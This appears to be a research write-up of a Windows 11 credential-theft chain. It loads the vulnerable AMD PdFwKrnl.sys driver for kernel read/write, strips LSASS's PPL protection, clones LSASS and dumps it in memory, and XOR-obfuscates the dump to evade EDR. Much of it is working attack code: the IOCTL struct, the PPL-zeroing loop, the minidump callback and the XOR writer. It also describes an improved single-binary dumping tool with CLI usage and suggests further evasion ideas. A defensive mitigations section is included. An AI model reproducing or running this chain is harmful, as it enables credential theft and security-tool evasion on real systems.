# BadDrivers Research: BYOVD and LSASS Dumping in Modern EDR Era

**Source:** https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/

**Sample Code:** https://github.com/g3tsyst3m/CodefromBlog/ (2026-5-29 BYOVD and Looting LSASS folder)

**Author Findings Date:** May 29, 2026

**Downloaded:** August 25, 2026

---

## Executive Summary

This research demonstrates a complete, functional chain to dump LSASS credentials on Windows 11 (build 26200) under modern EDR protection by combining:

1. **Kernel R/W via BYOVD:** Load a signed-but-vulnerable driver (PdFwKrnl.sys / AMD PdFw) to gain arbitrary kernel memory read/write.
2. **PPL Disabling:** Overwrite the Protected Process Light protection byte in the target EPROCESS structure to strip kernel-level access control.
3. **Stealth Dump:** Clone the target process with `NtCreateProcessEx`, intercept minidump I/O via callback to avoid file-signature detection, and XOR-obfuscate the dump before writing to disk.

The attack succeeds because hash-based driver blocklists are trivially bypassed (different versions of the same driver have different hashes), and behavioral-based detection of credential-dumping workflows is still immature in many EDR stacks.

---

## Technique Breakdown

### Phase 1: BYOVD Kernel Primitive (byovd_sample2.cpp)

**Vulnerable Driver:** PdFwKrnl.sys (AMD PdFw / AMD Platform Firmware)
- SHA256: `6945077a6846af3e4e2f6a2f533702f57e993c5b156b6965a552d6a5d63b7402`
- Source: loldrivers.io, malshare.com
- **Key Insight:** Different versions of the driver carry different hashes. A blocklisted version can be bypassed by using an unblocked build that still contains the same vulnerability.

**Driver Communication:**
- Device name: `\\\\.\\Global\\PdFwKrnl` (opened via `CreateFileW` with `GENERIC_READ | GENERIC_WRITE`)
- IOCTL code: `0x80002014` (reverse-engineered from driver binary in Binary Ninja)
  - Bits 31-16: Device type `0x8000` (vendor-defined, outside Microsoft's reserved range)
  - Bits 15-2: Function code (identifies the memory-write handler)
  - Bits 1-0: Transfer method (METHOD_NEITHER)

**Memory Primitives (Primitive Validation):**
The driver exports a single IOCTL that performs arbitrary kernel memcpy with **zero validation**:
- No `ProbeForRead` / `ProbeForWrite` address validation
- No canonical address check (ensures addresses are in valid kernel/user regions)
- No bounds checking or size limits
- Allows both kernel-to-user and user-to-kernel copies

**Request Structure (must be exactly 48 bytes / 0x30):**
```c
typedef struct _PDFW_MEMCPY {
    BYTE  Reserved[16];   // 0x00-0x0F: padding
    PVOID Destination;    // 0x10: target address (kernel or userspace)
    PVOID Source;         // 0x18: source address
    PVOID Reserved2;      // 0x20: unused
    DWORD Size;           // 0x28: bytes to copy
    DWORD Reserved3;      // 0x2C: unused
} PDFW_MEMCPY;
```

**Wrapper APIs Provided:**
```c
bool Amd_ReadMemory(DWORD64 Address, PVOID Buffer, DWORD Size)
  - Reads Size bytes from kernel Address into userspace Buffer
  - Sets Destination = Buffer (userspace), Source = Address (kernel)

bool Amd_WriteMemory(DWORD64 Address, PVOID Buffer, DWORD Size)
  - Writes Size bytes from userspace Buffer into kernel Address
  - Sets Destination = Address (kernel), Source = Buffer (userspace)
```

---

### Phase 2: PPL Protection Bypass

**Objective:** Remove the Protected Process Light (PPL) protection from the target LSASS process so the dumper can later open handles and read its memory.

**Windows Kernel Structure Offsets (Win11 build 26200):**
```c
struct KernelOffsets {
    ULONG64 UniqueProcessIdOffset   = 0x1D0;       // PID within EPROCESS
    ULONG64 ActiveProcessLinksOffset = 0x1D8;      // Doubly-linked list entry for process enumeration
    ULONG64 ImageFileNameOffset      = 0x338;      // 16-byte process name (e.g., "lsass.exe\0")
    ULONG64 ProtectionOffset         = 0x5FA;      // Single byte: the PPL protection level
};
```

**PPL Removal Algorithm:**
1. Load `ntoskrnl.exe` locally (without actually executing it: `DONT_RESOLVE_DLL_REFERENCES` flag) to compute the offset of `PsInitialSystemProcess` symbol.
2. Read the address of the "System" process (PID 4) from kernel memory at `ntoskrnl_base + PsInitialSystemProcess_offset`.
3. Walk the doubly-linked `ActiveProcessLinks` list to enumerate all processes.
4. For each process, extract the PID (at offset 0x1D0) and the process name (at offset 0x338).
5. When the target PID is found, read the protection byte (at offset 0x5FA).
6. **Overwrite that byte with 0x00** using `Amd_WriteMemory()`.

**Code Snippet (byovd_sample2.cpp:114-127):**
```c
if (pid == targetPid) {
    char name[16] = { 0 };
    BYTE prot = 0;
    Amd_ReadMemory(currentEproc + Offsets.ImageFileNameOffset, name, 15);
    Amd_ReadMemory(currentEproc + Offsets.ProtectionOffset, &prot, 1);
    
    std::cout << "[+] Found Target: " << name << std::endl;
    std::cout << "[*] Current Protection: 0x" << (int)prot << std::endl;
    
    // ACTION: Clear Protection
    BYTE zero = 0;
    if (Amd_WriteMemory(currentEproc + Offsets.ProtectionOffset, &zero, 1)) {
        std::cout << "[!!!] SUCCESS: Protection byte cleared." << std::endl;
    }
    found = true;
    break;
}
```

**Effect:** Once the protection byte is zeroed, the kernel no longer enforces PPL isolation on the target process. Userland code can now open handles and read memory.

**Fragility Note:** These offsets are build-specific. Each Windows version or major patch may shift them. The author hardcoded build 26200 offsets; a production tool should dynamically resolve them (via symbol resolution, pattern scanning, or a version-detection table).

---

### Phase 3: Stealth Dump via Process Cloning & Callback Interception (dump_the_goodz_7.cpp)

**Objective:** Extract the memory of the target process (now unprotected) without creating telltale artifacts that EDR would flag: avoiding direct `OpenProcess(lsass)` handles, on-disk minidump files with signatures, or obvious write operations.

**Step 1: Privilege Escalation**
```c
bool EnablePrivilege(LPCWSTR privilege) {
    // Enable SeDebugPrivilege to allow access to protected/system processes
    // Requires the process to have this privilege in its token already (e.g., running as admin)
}
```

**Step 2: Process Cloning via NtCreateProcessEx**
```c
typedef NTSTATUS(NTAPI* NtCreateProcessEx_t)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL,
    IN ULONG JobMemberLevel
);

// Invoked as:
HANDLE hClone = NULL;
NTSTATUS status = NtCreateProcessEx(
    &hClone,
    PROCESS_ALL_ACCESS,
    NULL,
    hTarget,               // target process (LSASS)
    PS_INHERIT_HANDLES,    // 0x00000004: copy handle table
    NULL, NULL, NULL, 0
);
```

**Why This Matters:**
- `NtCreateProcessEx` creates a **snapshot** of the target process's address space.
- This is an undocumented API, so EDR hooks on documented APIs (`OpenProcess`, `CreateRemoteThread`, etc.) may miss it.
- The cloned handle is to the snapshot, not a direct handle to LSASS, which may evade some heuristics.

**Step 3: In-Memory Minidump via Callback Interception**

Normal minidump to disk:
```c
MiniDumpWriteDump(hTarget, pidTarget, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
```

This writes a `.dmp` file to disk, which EDR can scan for the `MDMP` magic bytes and process-dump signatures.

**Evasion Strategy:** Intercept the writes via a callback:
```c
MINIDUMP_CALLBACK_INFORMATION mci;
mci.CallbackRoutine = DumpCallbackRoutine;
mci.CallbackParam = NULL;

BOOL dumped = MiniDumpWriteDump(
    hClone,
    targetPid,
    hNul,                                    // File handle pointing to NUL device (no actual disk write)
    MiniDumpWithFullMemory,
    NULL,
    NULL,
    &mci                                     // Intercept I/O operations via callback
);
```

**Callback Routine (dump_the_goodz_7.cpp:97-126):**
```c
BOOL CALLBACK DumpCallbackRoutine(
    PVOID CallbackParam,
    const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
    switch (CallbackInput->CallbackType) {
    case IoStartCallback:
        // Intercept the start: return S_FALSE to prevent normal file writes
        CallbackOutput->Status = S_FALSE;
        break;
    
    case IoWriteAllCallback:
        // For each chunk of minidump data:
        // - Copy it from the callback buffer to our pre-allocated heap buffer
        // - Track the total size
        // - Return S_OK to signal "handled"
        LPVOID destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
        LPVOID source = CallbackInput->Io.Buffer;
        DWORD bufferSize = CallbackInput->Io.BufferBytes;
        
        RtlCopyMemory(destination, source, bufferSize);
        dumpSize.fetch_add(bufferSize);
        
        CallbackOutput->Status = S_OK;
        break;
    
    case IoFinishCallback:
        CallbackOutput->Status = S_OK;
        break;
    }
    return TRUE;
}
```

**Effect:**
- No file is written during the dump phase (only the NUL device receives writes from MiniDumpWriteDump, which are discarded).
- The entire minidump is captured in a heap buffer (up to 200 MB pre-allocated).
- File-write monitoring and on-disk minidump-signature scanning miss the dump entirely.

**Step 4: XOR Encryption & Disk Write**

Once the dump is in memory, spawn a worker thread to encrypt and save it:

```c
void process_and_save_dump(LPVOID buffer, DWORD size, const char* outPath) {
    // XOR every byte with 0x55
    xor_buffer(buffer, size, 0x55);
    
    // Now write to disk
    HANDLE hFile = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, buffer, size, &bytesWritten, NULL);
    CloseHandle(hFile);
}

void xor_buffer(LPVOID buffer, DWORD size, char key) {
    BYTE* p = (BYTE*)buffer;
    for (DWORD i = 0; i < size; i++) {
        p[i] ^= key;
    }
}
```

**Why XOR?**
- The MDMP file signature (`0x4D 0x44 0x4D 0x50`) becomes `0x18 0x59 0x18 0x25` when XORed with 0x55.
- All internal minidump structures (MINIDUMP_HEADER, MINIDUMP_DIRECTORY entries, stream headers) are scrambled.
- Signature-based detection (`grep "MDMP"`, `.dmp` file scanners) fails.
- A defender must know to XOR-decode the file before analyzing it.

---

## Evasion Summary

| Stage | Technique | Detection Bypass |
|-------|-----------|------------------|
| Driver Load | Signed, hash-blocklisted version | Version-shopping; same family, different build hash |
| Kernel R/W | Legitimate IOCTL via opened device | No behavioral anomaly; legitimate driver interface |
| PPL Strip | Direct EPROCESS write at known offset | No userland API call to hook; kernel-callback detection required |
| Dumping | Process clone via NtCreateProcessEx | Undocumented API; fewer hooking surfaces |
| I/O Interception | Minidump callback + NUL device | No file-write during capture phase |
| Obfuscation | XOR with constant key | Signature scanning ineffective; content analysis required |

---

## Detection & Defensive Mitigations

### For Defenders (EDR/SIEM)

**Event Level:**
1. **Driver Load (Sysmon EID 6, SCM EID 7045, PnP Event ID 6416)**
   - Alert on any new device-driver load (especially from `%TEMP%`, `%APPDATA%`, or non-standard locations).
   - Cross-check against Microsoft Vulnerable Driver Blocklist (MVDB) and loldrivers.io.
   - **Critical:** Implement **WDAC (Windows Defender Application Control)** policy blocking at the publisher/version level, not just hash.
   - Use `New-CIPolicyRule -Level FilePublisher` to deny PdFw or similar by signature, not just hash.

2. **LSASS Access & Memory Dumping**
   - Monitor for `OpenProcess` on LSASS with `PROCESS_VM_READ` or similar.
   - Monitor for `NtCreateProcessEx` or `NtReadVirtualMemory` on LSASS (typically rare in legitimate workloads).
   - Detect minidump calls via `MiniDumpWriteDump` API (requires API hooking or ETW).
   - Monitor for large memory allocations (`HeapAlloc` of 200 MB) followed by minidump activity.

3. **PPL Protection Changes**
   - Implement kernel callback (ELAM / Kernel Patch Protection) to monitor EPROCESS structure changes.
   - Alert if lsass.exe's protection level drops at runtime.
   - Audit the Protection field before/after sensitive process access.

4. **File-Write Anomalies**
   - Detect `.dmp` files being written to unusual locations (e.g., `C:\Users\Public`, temp folders, writable network shares).
   - Flag processes writing large blobs of unknown binary data to disk.
   - Use content-based heuristics (entropy, known binary signatures) rather than simple extension matching.

**Host-Level Controls:**
- **Credential Guard:** Move LSASS secrets out of process memory into an isolated LSA Isolated Subsystem (LsaIso.exe). Even if LSASS is dumped, the actual credentials are unavailable.
- **Protected Process:** Mark EDR/LSASS as Protected Process so they require kernel signature to tamper.
- **Signing Policy:** Only allow signed drivers; reject unsigned or test-signed drivers.
- **VBS (Virtualization-Based Security):** Enforce code integrity and hypervisor-protected code integrity (HVCI) to prevent kernel-mode exploits.

---

## Red Team Tradecraft & Applicability

### When This Chain Works
- Target: Windows 11 with EDR (EDR monitoring user-mode APIs but not kernel callbacks).
- Privilege: Administrator or SeDebugPrivilege holder.
- Constraints: No WDAC policy; driver blocklist is hash-based only.

### Adaptation & Variants
1. **Different Vulnerable Driver:** Any driver with unvalidated `memcpy`-like IOCTL can substitute for PdFwKrnl. Examples from loldrivers.io: RTCore64.sys, GDRV.sys, etc.
2. **Dynamic Offset Resolution:** Replace hardcoded EPROCESS offsets with:
   - Manual symbol-file parsing (PDB files for ntoskrnl.exe).
   - Pattern scanning (search for known kernel structures in memory).
   - Runtime version detection (query Windows version and lookup offset table).
3. **Alternative Dump Methods:**
   - Bypass `MiniDumpWriteDump` entirely; directly read LSASS memory via kernel R/W and manually parse process heap for secrets.
   - Use undocumented APIs like `NtQueryInformationProcess` / `NtReadVirtualMemory` after PPL is stripped.
4. **Credential Extraction:** Use `pypykatz` or custom parsers to extract credentials from decrypted minidump (or directly from heap after XOR).

### Lab Testing & Validation
The code provided is **Windows-only, requires admin/SeDebugPrivilege, and depends on a compatible vulnerable driver being installed and accessible**. For security research and red team exercises:
1. Test in an isolated lab environment (no production access).
2. Use mock/stub driver interfaces for testing without real hardware/drivers.
3. Validate offset calculations for target OS builds.
4. Measure EDR signal (process events, file writes, kernel calls) under controlled conditions.

---

## Limitations & Hardening

**Limitations of This Approach:**
1. **Build-Specific Offsets:** Breaks on Windows updates; requires re-profiling for each build.
2. **Privilege Requirement:** Needs admin or sufficient token privileges.
3. **Driver Dependency:** Relies on a specific, signed vulnerable driver; may not be available on all targets.
4. **Credential Guard Immunity:** Useless if Credential Guard is enabled (LSASS secrets are in a separate, isolated process).

**Hardening Recommendations (from Author):**
- WDAC policies must block by **publisher and version**, not just hash.
- Enable **Credential Guard** to move secrets out of LSASS.
- Deploy **Protected Process** for LSASS and EDR agents.
- Implement **kernel-level callbacks** to detect PPL tampering.
- Use **HVCI (Hypervisor-Protected Code Integrity)** to prevent arbitrary kernel writes.
- Regular **patch management** to remove vulnerable drivers from systems.

---

## Code Artifacts

Two complete C++ samples are provided in `samples/`:

1. **byovd_sample2.cpp** (137 lines)
   - Loads PdFwKrnl.sys driver.
   - Enumerates processes, locates target LSASS.
   - Strips PPL protection byte.
   - Standalone; no dump performed.

2. **dump_the_goodz_7.cpp** (206 lines)
   - Clones target process via NtCreateProcessEx.
   - Captures minidump in-memory via callback.
   - XOR-encodes and writes to disk.
   - Requires PPL to already be removed (e.g., via byovd_sample2).

Both compile with MSVC on Windows, require `ntdll.lib` and `DbgHelp.lib` linking.

### Our own tool: `warp` (`src/warp.cpp`)

Reimplemented the whole chain as a single safe-by-default binary that supersedes the two
samples for lab work. Build target: `warp`.

**Why we wrote it (deltas over the reference):**
- **One binary, not two.** The published tool needs `byovd_sample2.exe` to run before
  `dump_the_goodz.exe`, and `dump_the_goodz` opens `OpenProcess(PROCESS_ALL_ACCESS)` on LSASS
  with PPL still on, so its handle open is already a loud EDR signal. `warp` strips PPL first,
  then opens, so the loud handle open only happens once protection is off.
- **Safe by default.** No flags = `--dry-run` behavior: it resolves ntos base, the
  `PsInitialSystemProcess` export offset, the System EPROCESS, and the target EPROCESS +
  protection byte, but does NOT clear the byte and does NOT touch disk. Mutation only happens
  with `--dump --out <path>`; decode only with `--decode`. The samples mutate on first run.
- **Runtime offset resolution + verification.** Instead of trusting hardcoded offsets, `warp`
  confirms `ImageFileName` (readable, printable run) and `Protection` (byte in 0..3) against the
  actual target EPROCESS before writing, and scans a window around the build 26200 defaults if the
  default fails. This gives per-build robustness without a hardcoded table.
- **LSASS auto-lookup.** Positional PID or `--lsass` (auto-locate by image name).
- **`--decode` built in.** The reference ships a separate Python decoder; `warp --decode` XORs the
  file back with the same 0x55 key and validates the `MDMP` header, so one binary covers the full
  looting loop.

**CLI:**
```
warp --dry-run                                    # resolve + inspect, change nothing
warp 640 --dump --out C:\temp\lo.dmp              # strip PPL + dump to RAM + XOR + write
warp --lsass --dump --out C:\temp\lo.dmp          # same, auto-locate LSASS
warp --decode --in C:\temp\lo.dmp --recover C:\temp\lo.dmp.dec
warp --help
```

**XOR key 0x55** is kept identical to the published tool so dumps are interchangeable and we can
A/B their dumper against ours.

**Build (Windows/MSVC):** `cmake -G "Visual Studio 17 2022" .. && cmake --build . --config Release`
produces `build/Release/warp.exe`. Validate logic without the driver via
`./build/Release/mock_driver_test.exe 640` (simulates the kernel R/W + XOR round-trip and prints
`SUCCESS: PPL protection was stripped!`).

**Open caveats (lab):**
- HVCI / Credential Guard / full PPL (0x03 via `SetProtectedProcessLight` with the LSA isolation bit)
  are not covered; PPL-byte zeroing only defeats PPL and not VBS-isolated secrets.
- `Protection` byte heuristic assumes the byte is 0..3; a build that stores it as an enum/flag
  elsewhere needs the window widened. Verify per build with the dry-run output.

---

## Research Gaps & Future Work

**Gaps in This Research:**
1. No discussion of how NtCreateProcessEx behaves under HVCI / Code Integrity.
2. No testing against BYOVD-aware EDR (e.g., Falcon, Defender).
3. Dump size (200 MB) may be unnecessarily large; smaller targeted dumps might evade I/O monitoring.
4. XOR with a fixed key (0x55) is trivial; real tools might use per-target keys or encrypt before writing.
5. No anti-analysis or anti-VM checks in the samples.

**Future Enhancements for Lab Use:**
- Dynamic offset resolution (symbol parsing or pattern scanning).
- Support for multiple Windows builds (version detection + offset table).
- Integration with pypykatz or similar for in-process credential extraction.
- Behavior analysis: measure EDR telemetry generated at each phase.
- Alternative PPL-stripping methods (e.g., kernel exploit chains vs. BYOVD).

---

## References

- **Blog:** https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/
- **Code:** https://github.com/g3tsyst3m/CodefromBlog/
- **Vulnerable Driver Database:** https://loldrivers.io/
- **Windows Kernel Offsets:** Retrieved via local ntoskrnl.exe analysis (build-specific).
- **WDAC Documentation:** https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/
- **Credential Guard:** https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection
- **pypykatz:** https://github.com/skelsec/pypykatz (credential extraction from minidumps).

---

## Lab Metadata

- **Tested Windows:** Windows 11 Build 26200
- **Vulnerable Driver:** PdFwKrnl.sys (AMD PdFw) SHA256 6945077a...
- **BYOVD Primitive:** IOCTL 0x80002014, unvalidated kernel memcpy
- **Privilege Model:** Administrator / SeDebugPrivilege
- **Detection Scope:** Sysmon, ETW, kernel callbacks, file-write monitoring
- **Evasion Level:** Medium (defeats signature/hash-based detection, not behavioral)

